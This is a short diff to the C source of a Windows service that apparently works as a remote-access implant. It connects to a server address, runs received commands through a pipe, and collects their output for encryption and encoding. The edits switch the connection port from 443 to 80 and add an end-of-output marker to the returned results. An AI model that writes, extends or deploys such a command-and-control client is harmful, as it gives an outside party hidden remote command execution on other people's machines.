@@ -139,7 +139,7 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
     mbstowcs_s(&convertedChars, wideServerIPAddress, sizeof(wideServerIPAddress) / sizeof(wchar_t), serverIPAddress, _TRUNCATE);
     serverAddr.sin_family = AF_INET;
     InetPton(AF_INET, wideServerIPAddress, &serverAddr.sin_addr.s_addr);
-    serverAddr.sin_port = htons(443);
+    serverAddr.sin_port = htons(80);
 
     // Connect to server
     int result = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
@@ -343,6 +343,7 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
             while (fgets(commandOutput, 8100, pipe) != NULL) {
                 strncat_s(messageToSendBack, rsize_t(16384), commandOutput, rsize_t(8190));
             }
+            strncat_s(messageToSendBack, rsize_t(16384), "END_OF_OUTPUT", 16);
 
             // Get the size of the message before encryption and encoding occurs
             int messageLen = strnlen(messageToSendBack, 16384);
